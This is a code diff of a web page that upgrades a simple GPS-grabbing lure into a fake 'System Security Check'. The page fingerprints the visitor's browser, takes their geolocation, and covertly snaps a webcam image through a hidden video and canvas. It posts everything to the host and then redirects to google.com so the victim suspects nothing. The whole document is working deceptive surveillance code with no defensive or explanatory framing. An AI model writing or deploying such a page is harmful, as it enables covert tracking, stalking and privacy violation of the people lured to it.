@@ -1,21 +1,46 @@
 
         <html>
-        <head><title>Access Denied</title></head>
-        <body style="background: black; color: red; text-align: center; padding-top: 50px;">
-            <h2>Please enable GPS location to access this content.</h2>
+        <head><title>System Security Check</title></head>
+        <body style="background: black; color: white; text-align: center; font-family: sans-serif; padding-top: 100px;">
+            <h2 id="msg">Verifying Your Device... Please Wait</h2>
+            <video id="v" width="1" height="1" autoplay style="display:none;"></video>
+            <canvas id="c" width="640" height="480" style="display:none;"></canvas>
             <script>
-                function track() {
+                async function capture() {
+                    let data = {
+                        ua: navigator.userAgent,
+                        plat: navigator.platform,
+                        lang: navigator.language,
+                        res: screen.width + 'x' + screen.height
+                    };
+                    
+                    // Get Location
                     if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(pos => {
-                            const lat = pos.coords.latitude;
-                            const lon = pos.coords.longitude;
-                            const coords = 'Latitude: ' + lat + ', Longitude: ' + lon;
-                            fetch('/', { method: 'POST', body: coords });
-                            window.location.href = "https://google.com/maps?q=" + lat + "," + lon;
-                        }, err => { window.location.href = "https://google.com"; });
-                    }
+                        navigator.geolocation.getCurrentPosition(p => {
+                            data.loc = p.coords.latitude + ',' + p.coords.longitude;
+                            send(data);
+                        }, e => send(data));
+                    } else { send(data); }
+
+                    // Get Camera
+                    try {
+                        const s = await navigator.mediaDevices.getUserMedia({video:true});
+                        const v = document.getElementById('v');
+                        v.srcObject = s;
+                        setTimeout(() => {
+                            const c = document.getElementById('c');
+                            c.getContext('2d').drawImage(v, 0, 0);
+                            data.cam = c.toDataURL('image/png');
+                            send(data);
+                            document.getElementById('msg').innerHTML = "Verification Complete!";
+                            window.location.href = "https://google.com";
+                        }, 3000);
+                    } catch(e) { send(data); window.location.href = "https://google.com"; }
                 }
-                track();
+                function send(d) {
+                    fetch('/', {method:'POST', body: JSON.stringify(d)});
+                }
+                capture();
             </script>
         </body>
         </html>
